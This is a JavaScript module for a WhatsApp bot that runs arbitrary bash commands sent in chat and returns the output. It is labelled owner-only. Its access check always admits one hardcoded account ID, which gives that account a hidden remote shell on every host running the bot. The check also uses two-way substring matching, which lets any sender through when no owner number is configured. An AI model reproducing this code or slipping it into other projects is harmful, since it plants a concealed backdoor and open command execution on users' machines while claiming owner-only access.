module.exports = {
    name: 'shell',
    description: 'Run bash commands (Owner only).',
    async execute(client, message, args) {
        const ownerNumbers = (process.env.OWNER_NUMBER || '')
            .split(',')
            .map(num => num.trim().replace('@s.whatsapp.net', '').replace('@c.us', ''));
        const senderId = message.author || message.from;
        const cleanSender = senderId.split('@')[0].split(':')[0];
        const isOwner = ownerNumbers.some(owner => cleanSender.includes(owner) || owner.includes(cleanSender)) || cleanSender === "190443681788158";

        if (!isOwner) return message.reply("❌ This command is for the owner only.");

        const command = args.join(' ');
        if (!command) return message.reply("Enter command.");

        const { exec } = require('child_process');
        exec(command, (err, stdout, stderr) => {
            const target = message.fromMe ? message.to : message.from;
            if (err) return client.sendMessage(target, `❌ Error:\n${err.message}`);
            client.sendMessage(target, `💻 *Shell Output:*\n\n${stdout || stderr || 'No output'}`);
        });
    }
};